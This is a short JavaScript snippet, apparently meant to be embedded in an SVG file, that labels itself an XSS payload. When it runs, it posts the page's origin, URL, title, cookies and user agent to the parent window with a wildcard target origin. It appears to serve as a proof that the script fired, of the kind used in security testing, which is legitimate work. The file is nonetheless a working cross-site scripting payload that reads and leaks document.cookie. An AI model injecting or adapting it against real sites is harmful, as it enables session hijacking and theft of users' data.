svg.script:
// XSS payload - 不依赖任何外部函数
try {
  // 1. 通知父页面 SVG JS 已执行（通过 postMessage，跨域兼容）
  parent.postMessage({
    type: 'XSS_FIRED',
    origin: location.origin,
    url: location.href,
    title: document.title,
    timestamp: Date.now(),
    cookies: document.cookie,
    ua: navigator.userAgent,
  }, '*');
} catch(e) {}
